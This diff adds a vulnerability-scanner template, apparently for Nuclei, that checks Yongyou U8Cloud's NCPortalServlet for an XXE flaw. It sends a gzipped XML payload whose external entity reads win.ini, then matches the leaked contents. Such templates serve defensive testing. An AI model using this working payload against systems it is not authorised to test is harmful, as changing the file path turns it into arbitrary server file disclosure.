@@ -1,0 +1,27 @@
+id: cnvd-2025-06352-xxe-yongyou-u8cloud
+info:
+  name: Yongyou U8Cloud NCPortalServlet XXE Vulnerability (CNVD-2025-06352)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CNVD-2025-06352,xxe
+
+variables:
+  content: '<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///C://windows/win.ini"> ]><data><transinfo type="portal_login"><accountcode>&xxe;</accountcode></transinfo></data>'
+  payload: '{{gzip(content)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/servlet/~uap/nc.merp.bs.maportal.NCPortalServlet"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{payload}}"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(gunzip(body), "xml")
+          - contains(gunzip(body), "extensions")
+          - contains(gunzip(body), "files")
+          - contains(gunzip(body), "fonts")
